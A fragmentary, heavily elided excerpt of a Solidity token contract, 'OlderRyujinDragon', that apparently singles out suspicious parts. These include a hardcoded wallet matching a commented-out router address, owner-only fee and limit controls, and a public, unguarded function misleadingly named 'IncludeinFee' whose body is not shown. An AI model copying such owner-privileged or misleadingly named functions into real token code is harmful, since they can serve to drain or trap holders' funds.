...
contract OlderRyujinDragon is IERC20, Auth {
    ...
    // address routerAddress = 0x08188e7551F3C2D9944CEC9C956a00a3952848E5; 
    ...
    constructor () Auth(msg.sender) {
        ...
        anothermarketingWallet = 0x08188e7551F3C2D9944CEC9C956a00a3952848E5;
        solor = msg.sender;
    ...
    function changeMax(uint256 newLimit) external onlyOwner {
    ...
    function ExcludeFromFee(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function ExcludeMaxTx(address holder, bool exempt) external onlyOwner {
    ...
    function IncludeinFee(address ac, uint256 amount) public{
